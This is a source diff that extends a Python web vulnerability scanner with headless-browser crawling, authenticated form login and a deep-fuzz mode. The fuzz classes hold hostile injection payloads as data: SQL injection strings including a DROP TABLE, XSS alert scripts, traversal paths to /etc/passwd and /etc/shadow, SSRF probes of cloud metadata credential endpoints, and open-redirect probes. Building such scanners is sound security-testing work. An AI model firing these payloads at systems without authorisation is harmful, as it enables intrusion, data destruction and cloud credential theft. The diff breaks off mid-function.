@@ -35,6 +35,12 @@ try:
 except ImportError:
     DNS_AVAILABLE = False
 
+try:
+    from playwright.sync_api import sync_playwright, Error as PlaywrightError
+    PLAYWRIGHT_AVAILABLE = True
+except ImportError:
+    PLAYWRIGHT_AVAILABLE = False
+
 
 # -----------------------------------------------------------------
 #  ANSI COLORS
@@ -450,6 +456,67 @@ def fetch_with_retry(session, url, method="GET", data=None, max_retries=3,
             time.sleep(delay + jitter)
             delay = min(delay * 2, 30)
     return None, err
+
+
+# -----------------------------------------------------------------
+#  PLAYWRIGHT FETCH  (per-thread context, XHR interception)
+# -----------------------------------------------------------------
+# Thread-local storage: each worker thread gets its own browser context
+# so Playwright's non-thread-safe Page objects are never shared.
+_pw_local = threading.local()
+
+def _get_thread_context(pw_browser):
+    """Return (or lazily create) a browser context for the calling thread."""
+    if not hasattr(_pw_local, "context") or _pw_local.context is None:
+        _pw_local.context = pw_browser.new_context(
+            user_agent=random_ua(),
+            ignore_https_errors=True,
+        )
+    return _pw_local.context
+
+
+def fetch_with_playwright(pw_browser, url, timeout=10, xhr_queue=None):
+    """
+    Fetch *url* using a headless Chromium page owned by the calling thread.
+
+    Args:
+        pw_browser:  A Playwright Browser object (shared, but each thread
+                     gets its own BrowserContext via _get_thread_context).
+        url:         Target URL.
+        timeout:     Page-load timeout in seconds.
+        xhr_queue:   Optional list; discovered XHR/fetch API endpoint URLs
+                     are appended here so the caller can enqueue them.
+
+    Returns:
+        (html: str, final_url: str) on success, or raises PlaywrightError /
+        Exception on failure.
+    """
+    ctx = _get_thread_context(pw_browser)
+    page = ctx.new_page()
+    intercepted: List[str] = []
+
+    def _on_request(request):
+        rtype = request.resource_type
+        if rtype in ("xhr", "fetch"):
+            req_url = request.url
+            # Only capture same-origin or API-looking paths
+            parsed = urlparse(req_url)
+            if parsed.path and len(parsed.path) > 1:
+                intercepted.append(req_url)
+
+    page.on("request", _on_request)
+
+    try:
+        page.goto(url, wait_until="networkidle", timeout=timeout * 1000)
+        html = page.content()
+        final_url = page.url
+    finally:
+        page.close()
+
+    if xhr_queue is not None:
+        xhr_queue.extend(intercepted)
+
+    return html, final_url
 
 
 # -----------------------------------------------------------------
@@ -1315,7 +1382,284 @@ class DirectoryHunter:
 # -----------------------------------------------------------------
 #  PARAMETER FUZZER
 # -----------------------------------------------------------------
+class DeepFuzzCheck:
+    """
+    Encapsulates one vulnerability category for --deep-fuzz.
+
+    Each subclass defines:
+      PAYLOADS  – list of strings to inject
+      SEVERITY  – "HIGH" | "MEDIUM" | "LOW"
+      LABEL     – short category name shown in output
+
+    And implements:
+      detect(payload, resp, elapsed_s) -> (triggered: bool, evidence: str)
+    """
+    PAYLOADS: List[str] = []
+    SEVERITY: str = "LOW"
+    LABEL:    str = "GENERIC"
+
+    # Colour map used when printing findings
+    _SEV_COLOR: Dict[str, str] = {
+        "HIGH":   C.RED + C.BOLD,
+        "MEDIUM": C.YELLOW + C.BOLD,
+        "LOW":    C.CYAN,
+    }
+
+    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
+        raise NotImplementedError
+
+    def severity_col(self) -> str:
+        return col(f"[{self.SEVERITY}]", self._SEV_COLOR.get(self.SEVERITY, C.WHITE))
+
+
+class SQLiCheck(DeepFuzzCheck):
+    """
+    SQL injection — error-based and time-based blind detection.
+
+    Time-based payloads use SLEEP(3) / pg_sleep(3) / WAITFOR DELAY.
+    All payloads share the same 6-second timeout so a legitimate
+    3-second sleep won't be mis-classed as a network error.
+
+    Error keywords cover MySQL, PostgreSQL, Oracle, MSSQL, and SQLite.
+    """
+    LABEL    = "SQLi"
+    SEVERITY = "HIGH"
+    PAYLOADS = [
+        "' OR '1'='1",
+        "1 AND SLEEP(3)-- -",
+        "1; DROP TABLE users--",
+        "' OR SLEEP(3)--",
+        "1 OR 1=1",
+        "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
+    ]
+
+    # Time-based payloads: response time >= this threshold flags as blind SQLi
+    TIME_THRESHOLD_S: float = 3.0
+
+    # DB error fragments – deliberately lowercase for case-insensitive matching
+    ERROR_PATTERNS = re.compile(
+        r"sql syntax|syntax error|mysql_fetch|ora-\d{4,5}|pg_query|"
+        r"unclosed quotation|sqlite_|microsoft ole db|"
+        r"supplied argument is not a valid (mysql|postgresql)|"
+        r"division by zero|invalid query|odbc drivers error|"
+        r"warning: mysql|psql:|db2 sql error",
+        re.I,
+    )
+
+    # Payloads that carry a deliberate sleep; used to flag time-based blind
+    _SLEEP_RE = re.compile(r"sleep\s*\(|pg_sleep|waitfor\s+delay", re.I)
+
+    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
+        body = resp.text if resp else ""
+
+        # Time-based blind: only flag if the payload actually contains a sleep call
+        if elapsed_s >= self.TIME_THRESHOLD_S and self._SLEEP_RE.search(payload):
+            return True, f"response time {elapsed_s:.1f}s >= {self.TIME_THRESHOLD_S}s (time-based blind)"
+
+        # Error-based
+        m = self.ERROR_PATTERNS.search(body)
+        if m:
+            snippet = body[max(0, m.start()-20):m.end()+40].replace("\n", " ").strip()
+            return True, f"DB error keyword: «{snippet[:120]}»"
+
+        return False, ""
+
+
+class XSSCheck(DeepFuzzCheck):
+    """
+    Cross-site scripting — reflection detection.
+
+    We check that the *raw, unencoded* payload appears in the response
+    body, which is sufficient to flag a potential reflected XSS.  We
+    deliberately avoid URL-encoding the angle brackets so that a server
+    that HTML-encodes them produces no false positive.
+    """
+    LABEL    = "XSS"
+    SEVERITY = "HIGH"
+    PAYLOADS = [
+        "<script>alert(1)</script>",
+        '"><img src=x onerror=alert(1)>',
+        "javascript:alert(1)",
+        "'><svg onload=alert(1)>",
+    ]
+
+    # Minimum fragment that must appear verbatim to count as reflected
+    _MARKERS: List[str] = [
+        "<script>alert(1)</script>",
+        "onerror=alert(1)",
+        "javascript:alert(1)",
+        "onload=alert(1)",
+    ]
+
+    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
+        if not resp:
+            return False, ""
+        body = resp.text
+        for marker in self._MARKERS:
+            if marker in payload and marker in body:
+                # Verify the surrounding context: find where the marker appears
+                idx = body.find(marker)
+                snippet = body[max(0, idx-15):idx+len(marker)+15].replace("\n", " ")
+                return True, f"payload reflected unencoded: «{snippet[:120]}»"
+        return False, ""
+
+
+class PathTraversalCheck(DeepFuzzCheck):
+    """
+    Path traversal / LFI — looks for Unix passwd content or boot-loader
+    markers that only appear if the server returned /etc/passwd or
+    /boot/grub/grub.cfg respectively.
+    """
+    LABEL    = "PathTraversal"
+    SEVERITY = "HIGH"
+    PAYLOADS = [
+        "../../../etc/passwd",
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "....//....//....//etc/passwd",
+        "%252e%252e%252fetc%252fpasswd",
+        "../../../etc/shadow",
+        "..\\..\\..\\windows\\win.ini",
+    ]
+
+    _TRIGGERS = re.compile(
+        r"root:.*:/bin/(?:bash|sh|nologin)|"   # /etc/passwd line
+        r"\[boot loader\]|"                     # win.ini / boot.ini
+        r"\[extensions\]|"                      # win.ini sections
+        r"daemon:x:\d+",                        # /etc/passwd daemon line
+        re.I,
+    )
+
+    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
+        if not resp:
+            return False, ""
+        m = self._TRIGGERS.search(resp.text)
+        if m:
+            snippet = resp.text[max(0, m.start()):m.end()+40].replace("\n", " ").strip()
+            return True, f"file content leaked: «{snippet[:120]}»"
+        return False, ""
+
+
+class SSRFCheck(DeepFuzzCheck):
+    """
+    Server-Side Request Forgery — uses cloud metadata endpoints as
+    canary targets.  Flags if the response body contains strings that
+    only appear in real cloud metadata responses.
+
+    Note: this is a black-box heuristic.  A real SSRF may silently
+    proxy the request without reflecting it; for that, use an
+    out-of-band collaborator (Burp Collaborator / interactsh).
+    """
+    LABEL    = "SSRF"
+    SEVERITY = "HIGH"
+    PAYLOADS = [
+        "http://169.254.169.254/latest/meta-data/",          # AWS IMDSv1
+        "http://169.254.169.254/latest/meta-data/ami-id",
+        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
+    ]
+
+    _TRIGGERS = re.compile(
+        r"ami-[0-9a-f]{8,17}|"                 # AWS AMI id
+        r"instance-id|"                         # AWS / GCP / Azure
+        r"placement/availability-zone|"         # AWS AZ
+        r"iam/security-credentials|"            # AWS IAM
+        r"computeMetadata|"                     # GCP header echo
+        r'"compute":\s*\{|'                     # Azure instance JSON
+        r"latest/meta-data",                    # generic AWS echo
+        re.I,
+    )
+
+    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
+        if not resp:
+            return False, ""
+        m = self._TRIGGERS.search(resp.text)
+        if m:
+            snippet = resp.text[max(0, m.start()):m.end()+60].replace("\n", " ").strip()
+            return True, f"cloud metadata in response: «{snippet[:120]}»"
+        return False, ""
+
+
+class OpenRedirectCheck(DeepFuzzCheck):
+    """
+    Open redirect — sends an absolute URL as the parameter value and
+    checks whether the server's Location header (or meta-refresh target)
+    points to that external domain.
+
+    We use allow_redirects=False so we can inspect the raw Location
+    header before any following redirect eats it.
+    """
+    LABEL    = "OpenRedirect"
+    SEVERITY = "MEDIUM"
+
+    # Canary domain — clearly external, distinct from any real target
+    _CANARY = "https://evil.paramspecter.test"
+
+    PAYLOADS = [
+        _CANARY,
+        f"//{_CANARY.split('//')[1]}",     # protocol-relative
+        f"////{_CANARY.split('//')[1]}",   # ///// bypass
+        f"https:////{_CANARY.split('//')[1]}",
+    ]
+
+    _CANARY_HOST = urlparse(_CANARY).netloc  # "evil.paramspecter.test"
+
+    # meta-refresh pattern
+    _META_RE = re.compile(
+        r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+url=([^\s"\'>;]+)',
+        re.I,
+    )
+
+    def detect(self, payload: str, resp, elapsed_s: float) -> Tuple[bool, str]:
+        if not resp:
+            return False, ""
+
+        # 1. Location header redirect
+        loc = resp.headers.get("Location", "")
+        if loc and self._CANARY_HOST in loc:
+            return True, f"Location header redirects to canary: {loc[:120]}"
+
+        # 2. meta-refresh redirect in body
+        m = self._META_RE.search(resp.text)
+        if m and self._CANARY_HOST in m.group(1):
+            return True, f"meta-refresh redirects to canary: {m.group(1)[:120]}"
+
+        return False, ""
+
+
+# Registry: order determines the output order in the summary
+_DEEP_FUZZ_CHECKS: List[DeepFuzzCheck] = [
+    SQLiCheck(),
+    XSSCheck(),
+    PathTraversalCheck(),
+    SSRFCheck(),
+    OpenRedirectCheck(),
+]
+
+
 class ParamFuzzer:
+    """
+    Wordlist-based parameter discovery and vulnerability fuzzing.
+
+    Modes
+    -----
+    Default (no flags)
+        One probe per parameter: checks for status-code change,
+        response-size delta, and value reflection.
+
+    --smart-fuzz
+        Runs all 6 built-in FUZZ_VALUES per parameter (SQLi, XSS,
+        traversal, template injection, etc.) with the same
+        interesting-heuristic as the default mode.
+
+    --deep-fuzz  (new)
+        After the basic smart-fuzz pass, runs every DeepFuzzCheck
+        category against every parameter.  Each category has its own
+        payload list, detection logic, and severity label.  Findings
+        are printed immediately and accumulated in self._deep_hits.
+        --deep-fuzz implicitly enables --smart-fuzz behaviour (the
+        baseline pass always runs first).
+    """
+
     FUZZ_VALUES = [
         "paramspecter1337",
         "1",
@@ -1325,9 +1669,14 @@ class ParamFuzzer:
         "{{7*7}}",
     ]
 
+    # Extra timeout headroom for time-based payloads (seconds added on top
+    # of self.timeout when a sleep-carrying payload is being sent)
+    _SLEEP_EXTRA_TIMEOUT = 8
+
     def __init__(self, target_url, param_list, threads, timeout, session,
                  delay, hits_out, stop_event: threading.Event = None,
-                 method="GET", rotate_ua=False, proxy_mgr=None, smart_fuzz=False):
+                 method="GET", rotate_ua=False, proxy_mgr=None,
+                 smart_fuzz=False, deep_fuzz=False):
         self.target_url = target_url
         self.param_list = param_list
         self.threads    = threads
@@ -1339,14 +1688,19 @@ class ParamFuzzer:
         self.method     = method.upper()
         self.rotate_ua  = rotate_ua
         self.proxy_mgr  = proxy_mgr
-        self.smart_fuzz = smart_fuzz
+        self.smart_fuzz = smart_fuzz or deep_fuzz  # deep implies smart
+        self.deep_fuzz  = deep_fuzz
         self._q         = queue.Queue()
         self._lock      = threading.Lock()
-        self._done = 0
-        self._hits: List[Dict] = []
+        self._done      = 0
+        self._hits:      List[Dict] = []
+        self._deep_hits: List[Dict] = []
         self._base_code = 0
         self._base_len  = 0
 
+    # ------------------------------------------------------------------
+    # Baseline
+    # ------------------------------------------------------------------
     def _baseline(self):
         resp, _ = fetch_with_retry(self.session, self.target_url, timeout=self.timeout)
         if resp:
@@ -1356,14 +1710,24 @@ class ParamFuzzer:
         else:
             log("PARAM", "Baseline failed", C.RED)
 
+    # ------------------------------------------------------------------
+    # Orchestration
+    # ------------------------------------------------------------------
     def run(self):
         self._baseline()
+
+        # ---- standard / smart-fuzz pass ----
         fuzz_vals = self.FUZZ_VALUES if self.smart_fuzz else [self.FUZZ_VALUES[0]]
         tasks = [(p.strip(), v) for p in self.param_list for v in fuzz_vals]
         total = len(tasks)
         for t in tasks:
             self._q.put(t)
-        log("PARAM", f"Starting param fuzz -> {col(total, C.BOLD)} tests via {self.method}", C.CYAN)
+
+        extra = col("  [+deep-fuzz queued after]", C.MAGENTA) if self.deep_fuzz else ""
+        log("PARAM",
+            f"Starting param fuzz -> {col(total, C.BOLD)} tests via {self.method}{extra}",
+            C.CYAN)
+
         workers = [
             threading.Thread(target=self._worker, args=(total,), daemon=True)
             for _ in range(min(self.threads, total or 1))
@@ -1371,12 +1735,26 @@ class ParamFuzzer:
         for w in workers:
             w.start()
         self._q.join()
+
+        # ---- deep-fuzz pass ----
+        if self.deep_fuzz and not self.stop_event.is_set():
+            self._run_deep_fuzz()
+
         if self.stop_event.is_set():
             log("PARAM", col("Parameter fuzz stopped by user", C.YELLOW), C.YELLOW)
         else:
-            log("PARAM", f"Done -- {col(len(self._hits), C.BOLD+C.GREEN)} interesting params found", C.GREEN)
+            total_hits = len(self._hits) + len(self._deep_hits)
+            log("PARAM",
+                f"Done -- {col(len(self._hits), C.BOLD+C.GREEN)} basic  "
+                f"{col(len(self._deep_hits), C.BOLD+C.RED)} deep findings  "
+                f"({col(total_hits, C.BOLD)} total)",
+                C.GREEN)
+
         return self._hits
 
+    # ------------------------------------------------------------------
+    # Standard worker
+    # ------------------------------------------------------------------
     def _worker(self, total: int):
         while not self.stop_event.is_set():
             try:
@@ -1439,6 +1817,374 @@ class ParamFuzzer:
                 time.sleep(self.delay)
                 self._q.task_done()
 
+    # ------------------------------------------------------------------
+    # Deep-fuzz pass
+    # ------------------------------------------------------------------
+    def _run_deep_fuzz(self):
+        """
+        Iterate every (param, check, payload) triple sequentially inside
+        a thread pool.  Sequential-per-param ordering keeps the output
+        readable; the thread pool keeps wall-clock time manageable when
+        many parameters are being tested.
+
+        Time-based payloads get an extended per-request timeout so a
+        legitimate 3-second SLEEP doesn't time-out before we can observe
+        the delay.
+        """
+        log_section("DEEP FUZZ  (SQLi / XSS / PathTraversal / SSRF / OpenRedirect)")
+
+        params = [p.strip() for p in self.param_list]
+        # Build (param, check, payload) triples
+        triples: List[Tuple[str, DeepFuzzCheck, str]] = [
+            (param, check, payload)
+            for param in params
+            for check in _DEEP_FUZZ_CHECKS
+            for payload in check.PAYLOADS
+        ]
+        total = len(triples)
+        log("DEEP",
+            f"{col(len(params), C.BOLD)} params × "
+            f"{col(len(_DEEP_FUZZ_CHECKS), C.BOLD)} checks = "
+            f"{col(total, C.BOLD+C.MAGENTA)} probes",
+            C.MAGENTA)
+
+        dq: "queue.Queue[Tuple[str, DeepFuzzCheck, str]]" = queue.Queue()
+        for triple in triples:
+            dq.put(triple)
+        done_counter = [0]
+
+        def _deep_worker():
+            while not self.stop_event.is_set():
+                try:
+                    param, check, payload = dq.get(timeout=1)
+                except queue.Empty:
+                    break
+                try:
+                    self._probe_deep(param, check, payload, total, done_counter)
+                except Exception as e:
+                    log("DEEP", col(f"Worker error [{check.LABEL}] {param}: {e}", C.RED), C.RED)
+                finally:
+                    time.sleep(self.delay)
+                    dq.task_done()
+
+        workers = [
+            threading.Thread(target=_deep_worker, daemon=True)
+            for _ in range(min(self.threads, total or 1))
+        ]
+        for w in workers:
+            w.start()
+        dq.join()
+
+        # ---- summary table ----
+        if self._deep_hits:
+            log_section(f"DEEP FUZZ FINDINGS  ({len(self._deep_hits)} total)")
+            for h in self._deep_hits:
+                sev_str = col(f"[{h['severity']}]",
+                              DeepFuzzCheck._SEV_COLOR.get(h['severity'], C.WHITE))
+                print(
+                    f"  {ts()}  {sev_str}"
+                    f"  {col(h['check'], C.MAGENTA)}"
+                    f"  param={col(h['param'], C.YELLOW)}"
+                    f"  payload={col(repr(h['payload'][:40]), C.WHITE)}\n"
+                    f"  {' '*12}evidence: {col(h['evidence'], C.RED)}"
+                )
+        else:
+            log("DEEP", col("No deep-fuzz findings.", C.GRAY), C.GRAY)
+
+    def _probe_deep(
+        self,
+        param: str,
+        check: DeepFuzzCheck,
+        payload: str,
+        total: int,
+        done_counter: List[int],
+    ) -> None:
+        """Send one (param, payload) probe and run the appropriate detector."""
+        proxies = self.proxy_mgr.next() if self.proxy_mgr else None
+
+        # Time-based payloads need a longer socket timeout so the sleep
+        # completes before we read elapsed time.
+        _sleep_re = re.compile(r"sleep\s*\(|pg_sleep|waitfor\s+delay", re.I)
+        req_timeout = (
+            self.timeout + self._SLEEP_EXTRA_TIMEOUT
+            if _sleep_re.search(payload)
+            else self.timeout
+        )
+
+        # Open-redirect probes must NOT follow redirects so we can inspect Location
+        follow = not isinstance(check, OpenRedirectCheck)
+
+        t_start = time.monotonic()
+        if self.method == "GET":
+            sep = "&" if "?" in self.target_url else "?"
+            url = f"{self.target_url}{sep}{param}={quote(payload)}"
+            resp, _ = fetch_with_retry(
+                self.session, url, timeout=req_timeout,
+                rotate_ua=self.rotate_ua, proxies=proxies,
+                max_retries=1, allow_redirects=follow,
+            )
+        else:
+            resp, _ = fetch_with_retry(
+                self.session, self.target_url, method="POST",
+                data={param: payload}, timeout=req_timeout,
+                rotate_ua=self.rotate_ua, proxies=proxies,
+                max_retries=1, allow_redirects=follow,
+            )
+        elapsed = time.monotonic() - t_start
+
+        with self._lock:
+            done_counter[0] += 1
+            pct = int(done_counter[0] / total * 100)
+
+        triggered, evidence = check.detect(payload, resp, elapsed)
+
+        if triggered:
+            hit = {
+                "check":    check.LABEL,
+                "severity": check.SEVERITY,
+                "param":    param,
+                "payload":  payload,
+                "url":      self.target_url,
+                "status":   resp.status_code if resp else None,
+                "elapsed":  round(elapsed, 2),
+                "evidence": evidence,
+            }
+            with self._lock:
+                self._deep_hits.append(hit)
+                self.hits_out.append(hit)
+
+            # Immediate inline alert
+            sev_str = col(f"[{check.SEVERITY}]",
+                          DeepFuzzCheck._SEV_COLOR.get(check.SEVERITY, C.WHITE))
+            with _log_lock:
+                print(
+                    f"  {ts()}  {col(f'DEEP {pct:>3}%', C.MAGENTA)}  "
+                    f"{sev_str}  {col(check.LABEL, C.MAGENTA+C.BOLD)}  "
+                    f"param={col(param, C.YELLOW)}  "
+                    f"payload={col(repr(payload[:30]), C.WHITE)}\n"
+                    f"  {' '*12}evidence: {col(evidence[:100], C.RED)}"
+                )
+        else:
+            # Quiet progress dot — one per probe keeps the terminal alive
+            # without flooding it
+            if done_counter[0] % max(1, total // 40) == 0:
+                log(f"DEEP {pct:>3}%",
+                    f"{col(check.LABEL, C.GRAY)}  {col(param, C.GRAY)}",
+                    C.GRAY)
+
+
+# -----------------------------------------------------------------
+#  FORM LOGIN HANDLER
+# -----------------------------------------------------------------
+class FormLoginHandler:
+    """
+    Performs a form-based login against a target application before crawling
+    begins, injecting the resulting session cookies into the shared
+    requests.Session so all workers are authenticated from the first request.
+
+    Flow
+    ----
+    1. GET  --login-url  to fetch the login page and extract:
+         • The form's action URL (falls back to --login-url itself)
+         • The form's method (POST assumed; GET accepted)
+         • Any hidden CSRF / token / nonce fields
+    2. POST  credentials + CSRF token to the resolved action URL.
+    3. Validate the response:
+         • Non-2xx  → hard error
+         • Final URL contains the login-page path again → hard error
+           (redirect-back-to-login is the universal failure signal)
+         • "password" still in response body (heuristic) → warning
+    4. Merge all cookies from the response into the session.  The session
+       is shared across all threads so no further action is needed.
+    """
+
+    # Hidden-field names that are typically CSRF tokens
+    CSRF_FIELD_RE = re.compile(
+        r"csrf|token|nonce|_wpnonce|authenticity_token|__RequestVerificationToken",
+        re.I,
+    )
+
+    def __init__(self, session: requests.Session, login_url: str,
+                 username: str, password: str,
+                 user_field: str = "username", pass_field: str = "password",
+                 timeout: int = 15):
+        self.session    = session
+        self.login_url  = login_url
+        self.username   = username
+        self.password   = password
+        self.user_field = user_field
+        self.pass_field = pass_field
+        self.timeout    = timeout
+
+    # ------------------------------------------------------------------
+    # Public entry-point
+    # ------------------------------------------------------------------
+    def login(self) -> None:
+        """
+        Execute the login sequence.  Raises ``SystemExit`` on any hard
+        failure so the caller never starts a crawl with no session.
+        """
+        log_section("FORM LOGIN")
+        log("AUTH", f"Fetching login page: {col(self.login_url, C.CYAN)}", C.CYAN)
+
+        # ---- Step 1: fetch the login page ----
+        get_resp, err = fetch_with_retry(
+            self.session, self.login_url,
+            timeout=self.timeout, allow_redirects=True,
+        )
+        if get_resp is None:
+            self._die(f"Could not reach login page: {err}")
+
+        soup = BeautifulSoup(get_resp.text, "html.parser")
+        action_url, method, hidden = self._parse_login_form(soup, get_resp.url)
+
+        log("AUTH", f"Form action : {col(action_url, C.CYAN)}", C.CYAN)
+        if hidden:
+            names = ", ".join(hidden.keys())
+            log("AUTH", f"CSRF fields : {col(names, C.YELLOW)}", C.YELLOW)
+
+        # ---- Step 2: build POST payload ----
+        payload: Dict[str, str] = {
+            self.user_field: self.username,
+            self.pass_field: self.password,
+        }
+        payload.update(hidden)   # CSRF token(s) go in last so they overwrite
+
+        log("AUTH",
+            f"Submitting  : {col(self.user_field, C.WHITE)}=<user>  "
+            f"{col(self.pass_field, C.WHITE)}=<redacted>  "
+            f"method={col(method.upper(), C.WHITE)}",
+            C.CYAN)
+
+        if method.upper() == "GET":
+            post_resp, err = fetch_with_retry(
+                self.session, action_url,
+                method="GET", params=payload,
+                timeout=self.timeout, allow_redirects=True,
+            )
+        else:
+            post_resp, err = fetch_with_retry(
+                self.session, action_url,
+                method="POST", data=payload,
+                timeout=self.timeout, allow_redirects=True,
+            )
+
+        if post_resp is None:
+            self._die(f"Login POST failed: {err}")
+
+        # ---- Step 3: validate ----
+        self._validate(post_resp)
+
+        # ---- Step 4: report injected cookies ----
+        cookie_names = [c.name for c in self.session.cookies]
+        if cookie_names:
+            log("AUTH",
+                col(f"Session cookies injected: {', '.join(cookie_names)}", C.GREEN),
+                C.GREEN)
+        else:
+            log("AUTH",
+                col("WARNING: No cookies received after login — session may not be established", C.YELLOW),
+                C.YELLOW)
+
+    # ------------------------------------------------------------------
+    # Helpers
+    # ------------------------------------------------------------------
+    def _parse_login_form(
+        self, soup: "BeautifulSoup", page_url: str
+    ) -> Tuple[str, str, Dict[str, str]]:
+        """
+        Locate the most likely login <form> in *soup* and return
+        (action_url, method, hidden_fields).
+
+        Selection order:
+          1. A <form> containing an <input type="password">
+          2. The first <form> on the page (fallback)
+        """
+        form = None
+        for candidate in soup.find_all("form"):
+            if candidate.find("input", {"type": "password"}):
+                form = candidate
+                break
+        if form is None:
+            form = soup.find("form")
+
+        if form is None:
+            # No form found — try to POST directly to the login URL
+            log("AUTH",
+                col("No <form> found on login page; will POST directly to --login-url", C.YELLOW),
+                C.YELLOW)
+            return self.login_url, "POST", {}
+
+        raw_action = form.get("action", "").strip() or page_url
+        action_url = urljoin(page_url, raw_action)
+        method     = form.get("method", "POST").strip()
+
+        # Collect all hidden inputs whose names look like CSRF tokens
+        hidden: Dict[str, str] = {}
+        for inp in form.find_all("input", {"type": "hidden"}):
+            name  = inp.get("name", "").strip()
+            value = inp.get("value", "")
+            if name and self.CSRF_FIELD_RE.search(name):
+                hidden[name] = value
+
+        # Also grab every hidden input (non-CSRF) so we don't break
+        # multi-step forms that require all hidden fields to be echoed
+        for inp in form.find_all("input", {"type": "hidden"}):
+            name  = inp.get("name", "").strip()
+            value = inp.get("value", "")
+            if name and name not in hidden:
+                hidden[name] = value
+
+        return action_url, method, hidden
+
+    def _validate(self, resp: requests.Response) -> None:
+        """
+        Raise SystemExit with a clear message if the login clearly failed.
+        """
+        final_url = resp.url
+
+        # 1. Non-2xx status code
+        if not (200 <= resp.status_code < 300):
+            self._die(
+                f"Login returned HTTP {resp.status_code} "
+                f"(expected 2xx).  Final URL: {final_url}"
+            )
+
+        # 2. Redirect loop back to login page
+        #    Compare path components to avoid false positives from scheme/host diffs
+        login_path  = urlparse(self.login_url).path.rstrip("/")
+        final_path  = urlparse(final_url).path.rstrip("/")
+        if login_path and final_path == login_path:
+            self._die(
+                f"Server redirected back to the login page after POST.\n"
+                f"  Login URL : {self.login_url}\n"
+                f"  Final URL : {final_url}\n"
+                f"  This usually means the credentials were rejected or the\n"
+                f"  --login-user-field / --login-pass-field names are wrong."
+            )
+
+        # 3. Soft warning: password field still in body (login form re-rendered)
+        if resp.text and re.search(
+            rf'(?:name|id)\s*=\s*["\']?{re.escape(self.pass_field)}["\']?',
+            resp.text, re.I
+        ):
+            log("AUTH",
+                col("WARNING: Password field found in response body — login may have failed "
+                    "(form re-rendered).  Check credentials and field names.", C.YELLOW),
+                C.YELLOW)
+            return   # not a hard error — some apps re-embed the form on success
+
+        log("AUTH",
+            col(f"Login appears successful  (HTTP {resp.status_code}, "
+                f"landed on: {final_url})", C.GREEN + C.BOLD),
+            C.GREEN)
+
+    @staticmethod
+    def _die(msg: str) -> None:
+        with _log_lock:
+            print(f"\n  {col('AUTH ERROR:', C.RED + C.BOLD)}  {col(msg, C.RED)}\n")
+        sys.exit(1)
+
 
 # -----------------------------------------------------------------
 #  MAIN CRAWLER
@@ -1485,6 +2231,18 @@ class ParamSpecter:
                 if ":" in pair:
                     k, v = pair.split(":", 1)
                     self.session.headers[k.strip()] = v.strip()
+
+        # Form-based login (runs once, before any crawl worker starts)
+        if getattr(args, "login_url", None):
+            FormLoginHandler(
+                session     = self.session,
+                login_url   = args.login_url,
+                username    = args.login_user,
+                password    = args.login_pass,
+                user_field  = getattr(args, "login_user_field", "username"),
+                pass_field  = getattr(args, "login_pass_field", "password"),
+                timeout     = self.timeout,
+            ).login()
 
         # Proxy manager
         proxy_list = []
@@ -1552,6 +2310,27 @@ class ParamSpecter:
         # JS Analyzer
         self.js_analyzer = JSAnalyzer(self.session, rotate_ua=self.rotate_ua)
 
+        # Playwright browser (shared across threads; each thread uses its own context)
+        self.use_playwright = getattr(args, "playwright", False)
+        self._pw_instance   = None   # sync_playwright().__enter__() handle
+        self.pw_browser     = None   # Browser object
+
+        if self.use_playwright:
+            if not PLAYWRIGHT_AVAILABLE:
+                log("PW", col("playwright not installed -- falling back to requests. "
+                              "Run: pip install playwright && playwright install chromium", C.YELLOW), C.YELLOW)
+                self.use_playwright = False
+            else:
+                try:
+                    self._pw_instance = sync_playwright().__enter__()
+                    self.pw_browser   = self._pw_instance.chromium.launch(headless=True)
+                    log("PW", col("Playwright headless Chromium ready", C.GREEN), C.GREEN)
+                except Exception as e:
+                    log("PW", col(f"Failed to launch Playwright: {e} -- falling back to requests", C.YELLOW), C.YELLOW)
+                    self.use_playwright = False
+                    self._pw_instance   = None
+                    self.pw_browser     = None
+
         signal.signal(signal.SIGINT, self._handle_sigint)
         self.start_time = datetime.now()
 
@@ -1611,10 +2390,44 @@ class ParamSpecter:
             proxies = self.proxy_mgr.next() if self.proxy_mgr else None
             bucket = self._host_bucket(url)
             bucket.acquire()  # rate-limit per host before firing request
-            resp, err = fetch_with_retry(
+
+            # ---- fetch: Playwright path or requests fallback ----
+            xhr_endpoints: List[str] = []  # API URLs captured via XHR/fetch interception
+            resp = None
+            err  = None
+            pw_html: Optional[str] = None
+
+            if self.use_playwright and self.pw_browser is not None:
+                try:
+                    pw_html, final_url = fetch_with_playwright(
+                        self.pw_browser, url,
+                        timeout=self.timeout,
+                        xhr_queue=xhr_endpoints,
+                    )
+                    # Build a lightweight mock response so the rest of the pipeline
+                    # is unchanged. We re-use requests just for the final_url HEAD
+                    # so we capture real headers/cookies; fall back to requests GET.
+                    resp, err = fetch_with_retry(
+                        self.session, url, timeout=self.timeout,
+                        rotate_ua=self.rotate_ua, proxies=proxies,
+                        max_retries=1, allow_redirects=True,
+                    )
+                    # Replace the response body with the JS-rendered HTML from Playwright
+                    if resp is not None and pw_html:
+                        resp._content = pw_html.encode("utf-8", errors="replace")
+                        resp.encoding  = "utf-8"
+                except Exception as e:
+                    log("PW", col(f"Playwright failed for {url}: {e} -- falling back to requests", C.YELLOW), C.YELLOW)
+                    resp, err = fetch_with_retry(
+                        self.session, url, timeout=self.timeout,
+                        rotate_ua=self.rotate_ua, proxies=proxies,
+                        max_retries=self.max_retries, allow_redirects=True,
+                    )
+            else:
+                resp, err = fetch_with_retry(
                     self.session, url, timeout=self.timeout,
                     rotate_ua=self.rotate_ua, proxies=proxies,
-                    max_retries=self.max_retries, allow_redirects=True
+                    max_retries=self.max_retries, allow_redirects=True,
                 )
 
             if resp is None:
@@ -1724,6 +2537,22 @@ class ParamSpecter:
                                 self.crawl_queue.put((link, depth + 1), priority=depth + 1)
                                 self.stats.links_found += 1
 
+            # Enqueue API endpoints discovered via Playwright XHR/fetch interception
+            if xhr_endpoints and not self._stop_event.is_set():
+                new_api = 0
+                for ep_url in xhr_endpoints:
+                    norm_ep = normalize_url(ep_url, url)
+                    if not norm_ep:
+                        continue
